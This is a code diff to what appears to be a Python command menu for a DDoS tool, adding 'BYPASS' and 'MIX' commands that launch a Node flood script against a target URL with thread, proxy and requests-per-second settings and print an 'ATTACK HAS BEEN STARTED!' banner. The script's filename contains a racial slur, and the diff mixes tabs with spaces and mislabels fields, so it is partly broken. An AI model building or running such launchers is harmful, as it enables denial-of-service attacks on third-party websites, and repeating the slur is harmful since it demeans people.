@@ -635,15 +635,59 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                rps = cnc.split()[3]
-                threads = cnc.split()[4]
-                proxy = cnc.split()[5]
+                thread = cnc.split()[3]
+                proxy = cnc.split()[4]
+                rps = cnc.split()[5]
                 
-                os.system(f'node Tlsv1 {url} {time} {time}')
+                os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {proxy} {rps}')
+				os.system ("clear")
+				print(f"""
+\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
+\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
+\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
+\033[1;37m                            ATTACK HAS BEEN STARTED!
+\033[35m                ╚╦════════════════════════════════════════════╦╝
+\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
+\033[1;37m                TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
+\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
+\033[1;37m                THREAD   : \033[35m[ \033[1;37m{thread} \033[35m]
+\033[1;37m                PROXY    : \033[35m[ \033[1;37m{proxy} \033[35m]
+\033[1;37m                RPS      : \033[35m[ \033[1;37m{rps} \033[35m]
+\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS \033[35m]
+\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
+\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
+\033[35m           ╚════════════════════════════════════════════════════════╝
+""")
             except IndexError:
-                print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
-                print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
+                print('Usage: BYPASS <url> <time> <thread> <http.txt> <request_persecond>')
+                print('Example: BYPASS https://example.com 60 10 http.txt 5000')
 
+        elif "MIX" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                time = cnc.split()[3]
+                
+                os.system(f'node HTTP-NIGGA.js {url} {thread} {time}')
+				os.system ("clear")
+				print(f"""
+\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
+\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
+\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
+\033[1;37m                            ATTACK HAS BEEN STARTED!
+\033[35m                ╚╦════════════════════════════════════════════╦╝
+\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
+\033[1;37m                TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
+\033[1;37m                THREAD   : \033[35m[ \033[1;37m{time} \033[35m]
+\033[1;37m                TIME   : \033[35m[ \033[1;37m{thread} \033[35m]
+\033[1;37m                METHOD   : \033[35m[ \033[1;37mMIX \033[35m]
+\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
+\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
+\033[35m           ╚════════════════════════════════════════════════════════╝
+""")
+            except IndexError:
+                print('Usage: MIX <url> thread> <time>')
+                print('Example: BYPASS https://example.com 500 60')
         
 
 # BANNERS
